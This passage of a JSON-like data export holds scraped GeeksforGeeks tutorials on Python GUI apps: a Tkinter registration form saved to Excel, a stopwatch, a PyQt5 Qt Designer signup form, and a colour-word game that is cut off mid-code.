GUI\u00a0\u00a0\u00a0\u00a0gui.mainloop()Output :\u00a0https://media.geeksforgeeks.org/wp-content/uploads/20210114101728/FreeOnlineScreenRecorderProject1.mp4My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "874068910e260dcddcd48485208e343e",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisites: Tkinter Introduction, openpyxl module.Python provides the Tkinter toolkit to develop GUI applications. Now, it\u2019s upto the imagination or necessity of developer, what he/she want to develop using this toolkit. Let\u2019s make a simple information form GUI application using Tkinter. In this application, User has to fill up the required information, and that information is automatically written into an excel file.Firstly, create an empty excel file, after that pass an absolute path of the excel file in the program so that the program is able to access that excel file.Below is the implementation :\u00a0Python3# import openpyxl and tkinter modulesfrom openpyxl import *from tkinter import *\u00a0# globally declare wb and sheet variable\u00a0# opening the existing excel filewb = load_workbook('C:\\\\Users\\\\Admin\\\\Desktop\\\\excel.xlsx')\u00a0# create the sheet objectsheet = wb.active\u00a0\u00a0def excel():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# resize the width of columns in\u00a0\u00a0\u00a0\u00a0# excel spreadsheet\u00a0\u00a0\u00a0\u00a0sheet.column_dimensions['A'].width = 30\u00a0\u00a0\u00a0\u00a0sheet.column_dimensions['B'].width = 10\u00a0\u00a0\u00a0\u00a0sheet.column_dimensions['C'].width = 10\u00a0\u00a0\u00a0\u00a0sheet.column_dimensions['D'].width = 20\u00a0\u00a0\u00a0\u00a0sheet.column_dimensions['E'].width = 20\u00a0\u00a0\u00a0\u00a0sheet.column_dimensions['F'].width = 40\u00a0\u00a0\u00a0\u00a0sheet.column_dimensions['G'].width = 50\u00a0\u00a0\u00a0\u00a0\u00a0# write given data to an excel spreadsheet\u00a0\u00a0\u00a0\u00a0# at particular location\u00a0\u00a0\u00a0\u00a0sheet.cell(row=1, column=1).value = \"Name\"\u00a0\u00a0\u00a0\u00a0sheet.cell(row=1, column=2).value = \"Course\"\u00a0\u00a0\u00a0\u00a0sheet.cell(row=1, column=3).value = \"Semester\"\u00a0\u00a0\u00a0\u00a0sheet.cell(row=1, column=4).value = \"Form Number\"\u00a0\u00a0\u00a0\u00a0sheet.cell(row=1, column=5).value = \"Contact Number\"\u00a0\u00a0\u00a0\u00a0sheet.cell(row=1, column=6).value = \"Email id\"\u00a0\u00a0\u00a0\u00a0sheet.cell(row=1, column=7).value = \"Address\"\u00a0\u00a0# Function to set focus (cursor)def focus1(event):\u00a0\u00a0\u00a0\u00a0# set focus on the course_field box\u00a0\u00a0\u00a0\u00a0course_field.focus_set()\u00a0\u00a0# Function to set focusdef focus2(event):\u00a0\u00a0\u00a0\u00a0# set focus on the sem_field box\u00a0\u00a0\u00a0\u00a0sem_field.focus_set()\u00a0\u00a0# Function to set focusdef focus3(event):\u00a0\u00a0\u00a0\u00a0# set focus on the form_no_field box\u00a0\u00a0\u00a0\u00a0form_no_field.focus_set()\u00a0\u00a0# Function to set focusdef focus4(event):\u00a0\u00a0\u00a0\u00a0# set focus on the contact_no_field box\u00a0\u00a0\u00a0\u00a0contact_no_field.focus_set()\u00a0\u00a0# Function to set focusdef focus5(event):\u00a0\u00a0\u00a0\u00a0# set focus on the email_id_field box\u00a0\u00a0\u00a0\u00a0email_id_field.focus_set()\u00a0\u00a0# Function to set focusdef focus6(event):\u00a0\u00a0\u00a0\u00a0# set focus on the address_field box\u00a0\u00a0\u00a0\u00a0address_field.focus_set()\u00a0\u00a0# Function for clearing the# contents of text entry boxesdef clear():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# clear the content of text entry box\u00a0\u00a0\u00a0\u00a0name_field.delete(0, END)\u00a0\u00a0\u00a0\u00a0course_field.delete(0, END)\u00a0\u00a0\u00a0\u00a0sem_field.delete(0, END)\u00a0\u00a0\u00a0\u00a0form_no_field.delete(0, END)\u00a0\u00a0\u00a0\u00a0contact_no_field.delete(0, END)\u00a0\u00a0\u00a0\u00a0email_id_field.delete(0, END)\u00a0\u00a0\u00a0\u00a0address_field.delete(0, END)\u00a0\u00a0# Function to take data from GUI# window and write to an excel filedef insert():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# if user not fill any entry\u00a0\u00a0\u00a0\u00a0# then print \"empty input\"\u00a0\u00a0\u00a0\u00a0if (name_field.get() == \"\" and\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0course_field.get() == \"\" and\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0sem_field.get() == \"\" and\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0form_no_field.get() == \"\" and\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0contact_no_field.get() == \"\" and\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0email_id_field.get() == \"\" and\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0address_field.get() == \"\"):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"empty input\")\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# assigning the max row and max column\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# value upto which data is written\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# in an excel sheet to the variable\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0current_row = sheet.max_row\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0current_column = sheet.max_column\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# get method returns current text\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# as string which we write into\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# excel spreadsheet at particular location\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0sheet.cell(row=current_row + 1, column=1).value = name_field.get()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0sheet.cell(row=current_row + 1, column=2).value = course_field.get()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0sheet.cell(row=current_row + 1, column=3).value = sem_field.get()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0sheet.cell(row=current_row + 1, column=4).value = form_no_field.get()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0sheet.cell(row=current_row + 1, column=5).value = contact_no_field.get()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0sheet.cell(row=current_row + 1, column=6).value = email_id_field.get()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0sheet.cell(row=current_row + 1, column=7).value = address_field.get()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# save the file\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0wb.save('C:\\\\Users\\\\Admin\\\\Desktop\\\\excel.xlsx')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# set focus on the name_field box\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0name_field.focus_set()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# call the clear() function\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0clear()\u00a0\u00a0# Driver codeif __name__ == \"__main__\":\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# create a GUI window\u00a0\u00a0\u00a0\u00a0root = Tk()\u00a0\u00a0\u00a0\u00a0\u00a0# set the background colour of GUI window\u00a0\u00a0\u00a0\u00a0root.configure(background='light green')\u00a0\u00a0\u00a0\u00a0\u00a0# set the title of GUI window\u00a0\u00a0\u00a0\u00a0root.title(\"registration form\")\u00a0\u00a0\u00a0\u00a0\u00a0# set the configuration of GUI window\u00a0\u00a0\u00a0\u00a0root.geometry(\"500x300\")\u00a0\u00a0\u00a0\u00a0\u00a0excel()\u00a0\u00a0\u00a0\u00a0\u00a0# create a Form label\u00a0\u00a0\u00a0\u00a0heading = Label(root, text=\"Form\", bg=\"light green\")\u00a0\u00a0\u00a0\u00a0\u00a0# create a Name label\u00a0\u00a0\u00a0\u00a0name = Label(root, text=\"Name\", bg=\"light green\")\u00a0\u00a0\u00a0\u00a0\u00a0# create a Course label\u00a0\u00a0\u00a0\u00a0course = Label(root, text=\"Course\", bg=\"light green\")\u00a0\u00a0\u00a0\u00a0\u00a0# create a Semester label\u00a0\u00a0\u00a0\u00a0sem = Label(root, text=\"Semester\", bg=\"light green\")\u00a0\u00a0\u00a0\u00a0\u00a0# create a Form No. label\u00a0\u00a0\u00a0\u00a0form_no = Label(root, text=\"Form No.\", bg=\"light green\")\u00a0\u00a0\u00a0\u00a0\u00a0# create a Contact No. label\u00a0\u00a0\u00a0\u00a0contact_no = Label(root, text=\"Contact No.\", bg=\"light green\")\u00a0\u00a0\u00a0\u00a0\u00a0# create a Email id label\u00a0\u00a0\u00a0\u00a0email_id = Label(root, text=\"Email id\", bg=\"light green\")\u00a0\u00a0\u00a0\u00a0\u00a0# create a address label\u00a0\u00a0\u00a0\u00a0address = Label(root, text=\"Address\", bg=\"light green\")\u00a0\u00a0\u00a0\u00a0\u00a0# grid method is used for placing\u00a0\u00a0\u00a0\u00a0# the widgets at respective positions\u00a0\u00a0\u00a0\u00a0# in table like structure .\u00a0\u00a0\u00a0\u00a0heading.grid(row=0, column=1)\u00a0\u00a0\u00a0\u00a0name.grid(row=1, column=0)\u00a0\u00a0\u00a0\u00a0course.grid(row=2, column=0)\u00a0\u00a0\u00a0\u00a0sem.grid(row=3, column=0)\u00a0\u00a0\u00a0\u00a0form_no.grid(row=4, column=0)\u00a0\u00a0\u00a0\u00a0contact_no.grid(row=5, column=0)\u00a0\u00a0\u00a0\u00a0email_id.grid(row=6, column=0)\u00a0\u00a0\u00a0\u00a0address.grid(row=7, column=0)\u00a0\u00a0\u00a0\u00a0\u00a0# create a text entry box\u00a0\u00a0\u00a0\u00a0# for typing the information\u00a0\u00a0\u00a0\u00a0name_field = Entry(root)\u00a0\u00a0\u00a0\u00a0course_field = Entry(root)\u00a0\u00a0\u00a0\u00a0sem_field = Entry(root)\u00a0\u00a0\u00a0\u00a0form_no_field = Entry(root)\u00a0\u00a0\u00a0\u00a0contact_no_field = Entry(root)\u00a0\u00a0\u00a0\u00a0email_id_field = Entry(root)\u00a0\u00a0\u00a0\u00a0address_field = Entry(root)\u00a0\u00a0\u00a0\u00a0\u00a0# bind method of widget is used for\u00a0\u00a0\u00a0\u00a0# the binding the function with the events\u00a0\u00a0\u00a0\u00a0\u00a0# whenever the enter key is pressed\u00a0\u00a0\u00a0\u00a0# then call the focus1 function\u00a0\u00a0\u00a0\u00a0name_field.bind(\"<Return>\", focus1)\u00a0\u00a0\u00a0\u00a0\u00a0# whenever the enter key is pressed\u00a0\u00a0\u00a0\u00a0# then call the focus2 function\u00a0\u00a0\u00a0\u00a0course_field.bind(\"<Return>\", focus2)\u00a0\u00a0\u00a0\u00a0\u00a0# whenever the enter key is pressed\u00a0\u00a0\u00a0\u00a0# then call the focus3 function\u00a0\u00a0\u00a0\u00a0sem_field.bind(\"<Return>\", focus3)\u00a0\u00a0\u00a0\u00a0\u00a0# whenever the enter key is pressed\u00a0\u00a0\u00a0\u00a0# then call the focus4 function\u00a0\u00a0\u00a0\u00a0form_no_field.bind(\"<Return>\", focus4)\u00a0\u00a0\u00a0\u00a0\u00a0# whenever the enter key is pressed\u00a0\u00a0\u00a0\u00a0# then call the focus5 function\u00a0\u00a0\u00a0\u00a0contact_no_field.bind(\"<Return>\", focus5)\u00a0\u00a0\u00a0\u00a0\u00a0# whenever the enter key is pressed\u00a0\u00a0\u00a0\u00a0# then call the focus6 function\u00a0\u00a0\u00a0\u00a0email_id_field.bind(\"<Return>\", focus6)\u00a0\u00a0\u00a0\u00a0\u00a0# grid method is used for placing\u00a0\u00a0\u00a0\u00a0# the widgets at respective positions\u00a0\u00a0\u00a0\u00a0# in table like structure .\u00a0\u00a0\u00a0\u00a0name_field.grid(row=1, column=1, ipadx=\"100\")\u00a0\u00a0\u00a0\u00a0course_field.grid(row=2, column=1, ipadx=\"100\")\u00a0\u00a0\u00a0\u00a0sem_field.grid(row=3, column=1, ipadx=\"100\")\u00a0\u00a0\u00a0\u00a0form_no_field.grid(row=4, column=1, ipadx=\"100\")\u00a0\u00a0\u00a0\u00a0contact_no_field.grid(row=5, column=1, ipadx=\"100\")\u00a0\u00a0\u00a0\u00a0email_id_field.grid(row=6, column=1, ipadx=\"100\")\u00a0\u00a0\u00a0\u00a0address_field.grid(row=7, column=1, ipadx=\"100\")\u00a0\u00a0\u00a0\u00a0\u00a0# call excel function\u00a0\u00a0\u00a0\u00a0excel()\u00a0\u00a0\u00a0\u00a0\u00a0# create a Submit Button and place into the root window\u00a0\u00a0\u00a0\u00a0submit = Button(root, text=\"Submit\", fg=\"Black\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0bg=\"Red\", command=insert)\u00a0\u00a0\u00a0\u00a0submit.grid(row=8, column=1)\u00a0\u00a0\u00a0\u00a0\u00a0# start the GUI\u00a0\u00a0\u00a0\u00a0root.mainloop()Output :\u00a0\u00a0\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "10158b4ca5062c0f8d2024f1c1c24fbc",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "This article focus on creating a stopwatch using Tkinter in python\u00a0Tkinter : Tkinter is the standard GUI library for Python. Python when combined with Tkinter provides a fast and easy way to create GUI applications. Tkinter provides a powerful object-oriented interface to the Tk GUI toolkit. It\u2019s very easy to get started with Tkinter, here are some sample codes to get your hands on Tkinter in python.\u00a0\u00a0Python3# Python program to create a# a new window using Tkinter# importing the required librariesimport tkinter\u00a0# creating a object 'top' as instance of class Tktop = tkinter.Tk()\u00a0# This will start the blank windowtop.mainloop()Output:\u00a0\u00a0\u00a0Creating Stopwatch using TkinterNow lets try to create a program using Tkinter module to create a stopwatch.\u00a0A stopwatch is a handheld timepiece designed to measure the amount of time elapsed from a particular time when it is activated to the time when the piece is deactivated. A large digital version of a stopwatch designed for viewing at a distance, as in a sports stadium, is called a stop clock. In manual timing, the clock is started and stopped by a person pressing a button. In fully automatic time, both starting and stopping are triggered automatically, by sensors.\u00a0Required Modules: We are only going to use Tkinter for creating GUI and no other libraries will be used in this program.Source Code:\u00a0\u00a0Python3# Python program to illustrate a stop watch# using Tkinter#importing the required librariesimport tkinter as Tkinterfrom datetime import datetimecounter = 66600running = Falsedef counter_label(label):\u00a0\u00a0\u00a0\u00a0def count():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if running:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0global counter\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# To manage the initial delay.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if counter==66600:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0display=\"Starting...\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0tt = datetime.fromtimestamp(counter)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0string = tt.strftime(\"%H:%M:%S\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0display=string\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0label['text']=display\u00a0\u00a0 # Or label.config(text=display)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# label.after(arg1, arg2) delays by\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# first argument given in milliseconds\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# and then calls the function given as second argument.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Generally like here we need to call the\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# function in which it is present repeatedly.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Delays by 1000ms=1 seconds and call count again.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0label.after(1000, count)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0counter += 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Triggering the start of the counter.\u00a0\u00a0\u00a0\u00a0count()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# start function of the stopwatchdef Start(label):\u00a0\u00a0\u00a0\u00a0global running\u00a0\u00a0\u00a0\u00a0running=True\u00a0\u00a0\u00a0\u00a0counter_label(label)\u00a0\u00a0\u00a0\u00a0start['state']='disabled'\u00a0\u00a0\u00a0\u00a0stop['state']='normal'\u00a0\u00a0\u00a0\u00a0reset['state']='normal'\u00a0\u00a0\u00a0# Stop function of the stopwatchdef Stop():\u00a0\u00a0\u00a0\u00a0global running\u00a0\u00a0\u00a0\u00a0start['state']='normal'\u00a0\u00a0\u00a0\u00a0stop['state']='disabled'\u00a0\u00a0\u00a0\u00a0reset['state']='normal'\u00a0\u00a0\u00a0\u00a0running = False\u00a0\u00a0\u00a0# Reset function of the stopwatchdef Reset(label):\u00a0\u00a0\u00a0\u00a0global counter\u00a0\u00a0\u00a0\u00a0counter=66600\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# If rest is pressed after pressing stop.\u00a0\u00a0\u00a0\u00a0if running==False:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0reset['state']='disabled'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0label['text']='Welcome!'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# If reset is pressed while the stopwatch is running.\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0label['text']='Starting...'\u00a0\u00a0\u00a0root = Tkinter.Tk()root.title(\"Stopwatch\")\u00a0\u00a0\u00a0# Fixing the window size.root.minsize(width=250, height=70)label = Tkinter.Label(root, text=\"Welcome!\", fg=\"black\", font=\"Verdana 30 bold\")label.pack()f = Tkinter.Frame(root)start = Tkinter.Button(f, text='Start', width=6, command=lambda:Start(label))stop = Tkinter.Button(f, text='Stop',width=6,state='disabled', command=Stop)reset = Tkinter.Button(f, text='Reset',width=6, state='disabled', command=lambda:Reset(label))f.pack(anchor = 'center',pady=5)start.pack(side=\"left\")stop.pack(side =\"left\")reset.pack(side=\"left\")root.mainloop()Output:\u00a0\u00a0\u00a0\u00a0https://media.geeksforgeeks.org/wp-content/uploads/2017-10-26-at-19-18-25.mp4This article is contributed by Subhajit Saha. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "136313a8d07c0652d7fd110ea10e81d8",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Building GUI applications using the PYQT designer tool is comparatively less time-consuming than code the widgets. It is one of the fastest and easiest ways to create GUIs.\u00a0The normal approach is to write the code even for the widgets and for the functionalities as well. But using Qt-designer, one can simply drag and drop the widgets, which comes very useful while developing big-scale applications.\u00a0Installation of PyQt5 :\u00a0For Linux : sudo apt-get install python3-pyqt5For Windows :\u00a0 pip install pyqt5\n pip install pyqt5-tools Let\u2019s create a signup form using the QT designer tool. No code is required for creating forms, buttons, text boxes, etc! It is a rather drag and drops environment. So, using PyQt is a lot simpler than Tkinter.\u00a0QT Designer will be located at MyPythonInstallationDir\\Lib\\site-packages\\pyqt5-tools and is named designer.exe (on Windows OS).\u00a0Open Qt Designer, then select Main Window and click Create. Set your preferred size of the window by dragging the edges of the window.\u00a0To create the layout of the Signup form, the following widgets are needed :\u00a0Three text edit boxes.One button.Four Text Labels (SignId Banner, UserName label, Password and Confirm Password label).One has to find those widgets in Widget Tool Box. Just drag and drop the required widgets onto the Main Window or the window working on.\u00a0\u00a0To change the appearance of the window or the widget, just right click on the widget and click Change StyleSheet.\u00a0\u00a0To get a preview of the window, press Ctrl + R.\u00a0Save the file :\u00a0The file will be saved with the .ui extension. To convert this file (.ui extension) to a Python file (.py extension), follow these steps :\u00a0\u00a0Open the terminal and navigate to the folder where the layout.UI file is present.To convert into a Python file, type pyuic5 -x layout.ui -o layout.py on a terminal.Run layout.py using python!\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "f60f7846bc37690eb9145d98e5bd2ca9",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisite : Python GUI TkinterTKinter is widely used for developing GUI applications. Along with applications, we can also use Tkinter GUI to develop games.Let\u2019s try to make a game using Tkinter. In this game player has to enter color of the word that appears on the screen and hence the score increases by one, the total time to play this game is 30 seconds. Colors used in this game are Red, Blue, Green, Pink, Black, Yellow, Orange, White, Purple and Brown. Interface will display name of different colors in different colors. Player has to identify the color and enter the correct color name to win the game.\u00a0Below is the implementation of above game :# import the modules\u00a0import tkinterimport random\u00a0\u00a0# list of possible colour.colours = ['Red','Blue','Green','Pink','Black',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Yellow','Orange','White','Purple','Brown']score = 0\u00a0\u00a0# the game time left, initially 30 seconds.timeleft = 30\u00a0\u00a0# function that will start the game.def startGame(event):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if timeleft == 30:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# start the countdown timer.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0countdown()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# run the function to\u00a0\u00a0\u00a0\u00a0# choose the next colour.\u00a0\u00a0\u00a0\u00a0nextColour()\u00a0\u00a0# Function to choose and# display the next colour.def nextColour():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# use the globally declared 'score'\u00a0\u00a0\u00a0\u00a0# and 'play' variables above.\u00a0\u00a0\u00a0\u00a0global score\u00a0\u00a0\u00a0\u00a0global timeleft\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# if a game is currently in play\u00a0\u00a0\u00a0\u00a0if timeleft > 0:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# make the text entry box active.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0e.focus_set()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# if the colour typed is equal\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# to the colour of the text\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if e.get().lower() == colours[1].lower():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0score += 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# clear the text entry box.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0e.delete(0, tkinter.END)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0random.shuffle(colours)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# change the colour to type, by changing the\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# text _and_ the colour to a random colour value\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0label.config(fg = str(colours[1]), text = str(colours[0]))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# update the score.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0scoreLabel.config(text = \"Score: \" + str(score))\u00a0\u00a0\u00a0\u00a0# Countdown timer function\u00a0def countdown():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0global timeleft\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# if a game is in play\u00a0\u00a0\u00a0\u00a0if timeleft > 0:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# decrement the timer.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0timeleft -= 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# update the time left label\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0timeLabel.config(text = \"Time left: \"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ str(timeleft))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# run the function again after 1 second.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0timeLabel.after(1000, countdown)\u00a0\u00a0\u00a0\u00a0# Driver Code\u00a0\u00a0# create a GUI windowroot = tkinter.Tk()\u00a0\u00a0# set the titleroot.title(\"COLORGAME\")\u00a0\u00a0# set the sizeroot.geometry(\"375x200\")\u00a0\u00a0# add an instructions labelinstructions = tkinter.Label(root, text = \"Type in the 